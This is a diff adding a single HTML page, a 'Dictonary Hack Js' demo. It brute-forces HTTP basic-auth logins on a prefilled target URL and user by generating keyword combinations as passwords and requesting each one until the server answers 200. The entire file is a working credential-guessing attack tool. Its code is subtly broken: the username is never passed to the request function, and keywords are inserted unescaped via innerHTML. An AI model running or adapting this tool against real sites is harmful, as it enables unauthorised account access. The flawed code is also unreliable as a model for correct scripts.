@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Dictonary Hack Js - Demo</title>
+</head>
+
+<body>
+    <h1>Dictonary Hack Js - Demo</h1>
+    <div>
+        <label for="url">Url to attack</label>
+        <br>
+        <input id="url" type="text" value="https://www.ui0.fr/alex/">
+    </div>
+    <div>
+        <label for="user">User</label>
+        <br>
+        <input id="user" type="text" value="alex">
+    </div>
+    <div>
+        <label for="keyword">Keyword to add</label>
+        <br>
+        <input id="keyword" type="text">
+        <button onclick="addKeyword()">Add keyword</button>
+    </div>
+    <button onclick="hackFull()">Try</button>
+    <h2>Found</h2>
+    <span id="found"></span>
+    <h2>List Keyword</h2>
+    <div id="list">
+    </div>
+    <h2>Try password</h2>
+    <div id="password">
+    </div>
+
+</body>
+
+</html>
+<script>
+    var keywords = [];
+    var passStatus = {};
+    var found = false;
+
+    function removeKey(k) {
+        keywords.splice(k, 1);
+        updateKeywordDom();
+    }
+
+    function updateKeywordDom() {
+        document.getElementById("list").innerHTML = "";
+
+        for (var k in keywords) {
+            var word = document.createElement("span");
+            word.innerHTML = keywords[k];
+            var del = document.createElement("button");
+            del.setAttribute("onClick", "removeKey(" + k + ")");
+            del.innerHTML = "Delete";
+            var div = document.createElement("div");
+
+            div.appendChild(word);
+            div.appendChild(del);
+
+            document.getElementById("list").appendChild(div);
+        }
+    }
+
+    function addKeyword() {
+        var new_keyword = document.getElementById("keyword").value;
+        if (!keywords.includes(new_keyword) && new_keyword != "") {
+            keywords.push(new_keyword);
+            updateKeywordDom();
+        }
+        document.getElementById("keyword").value = "";
+    }
+
+    function getCombn(arr, pre) {
+            pre = pre || '';
+            if (!arr.length) {
+                return pre;
+            }
+            var ans = arr[0].reduce(function(ans, value) {
+                return ans.concat(getCombn(arr.slice(1), pre + value));
+            }, []);
+            return ans;
+    }
+
+
+
+    function genPassword() {
+        var new_list = [];
+        var generatedPassword = [];
+
+
+        new_list.push(keywords);
+        generatedPassword = generatedPassword.concat(getCombn(new_list));
+        new_list.push(keywords);
+        generatedPassword = generatedPassword.concat(getCombn(new_list));
+        new_list.push(keywords);
+        generatedPassword = generatedPassword.concat(getCombn(new_list));
+        console.log(generatedPassword);
+        for (var k in generatedPassword){
+            passStatus[generatedPassword[k]] = " <b style='color:orange;'>Not checked<b>";
+        }
+    }
+
+    function updatePasswordDom(){
+        document.getElementById("password").innerHTML = "";
+
+        for (var k in passStatus) {
+            var pass = document.createElement("span");
+            pass.innerHTML = k;
+            var status = document.createElement("span");
+            status.innerHTML = passStatus[k];
+            var div = document.createElement("div");
+
+            div.appendChild(pass);
+            div.appendChild(status);
+
+            document.getElementById("password").appendChild(div);
+        }
+    }
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function hackFull(){
+        passStatus = {};
+        found = false;
+        document.getElementById("found").innerHTML = "";
+        genPassword();
+        updatePasswordDom();
+        var user = document.getElementById("user").value;
+        for (var k in passStatus){
+            if (!found){
+                tryHack(k);
+                await sleep(100);
+            }
+        }
+    }
+
+    async function tryHack(pass, user) {
+        var url = document.getElementById("url").value;
+        var a = document.createElement("a");
+        a.href = url;
+
+        var req = new XMLHttpRequest();
+
+        req.onload = function (e) {
+            if (req.readyState === 4) {
+                if (req.status === 200) {
+                    console.log(req.responseText);
+                    passStatus[pass] = " <b style='color:green;'>Found !!<b>";
+                    document.getElementById("found").innerHTML = pass+ " <b style='color:green;'>Found !!<b>";
+                    found = true;
+                    updatePasswordDom();
+                } else {
+                    console.error(req.statusText);
+                    passStatus[pass] = " <b style='color:red;'>Not this one<b>";
+                    updatePasswordDom();
+                }
+            }
+        }
+        req.open("get", a.protocol + "//" + user + ":" + pass + "@" + a.hostname + a.pathname, true);
+        req.send();
+    }
+
+</script>
